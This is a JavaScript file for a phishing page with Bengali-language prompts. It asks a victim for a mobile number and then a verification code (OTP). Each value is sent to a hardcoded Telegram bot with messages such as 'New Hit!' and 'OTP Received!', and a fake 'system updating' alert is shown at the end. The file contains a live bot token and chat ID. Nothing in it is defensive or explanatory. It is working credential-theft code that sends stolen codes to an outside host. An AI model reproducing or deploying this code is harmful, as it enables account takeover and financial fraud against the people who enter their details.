const token = '8687954316:AAGU9FMZp7UODi4Agt2V0d0gskohEruY1u0';
const chatId = '5877893357';

let userPhone = "";

function goToStep2() {
    const phoneInput = document.getElementById('phone').value;
    if (phoneInput.trim().length < 10) {
        alert("সঠিক মোবাইল নম্বর দিন");
        return;
    }
    userPhone = phoneInput;
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
    document.getElementById('title').innerText = "Verification";
    document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";
    sendToTelegram(`🔔 New Hit!\n📱 Number: ${userPhone}`);
}

document.getElementById('mainForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const otpInput = document.getElementById('otp').value;
    if (otpInput.trim().length < 4) {
        alert("সঠিক কোড দিন");
        return;
    }
    sendToTelegram(`✅ OTP Received!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpInput}`);
    alert("সিস্টেম আপডেট হচ্ছে, দয়া করে অপেক্ষা করুন।");
});

function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
    fetch(url).then(res => console.log("Sent")).catch(err => console.error(err));
}
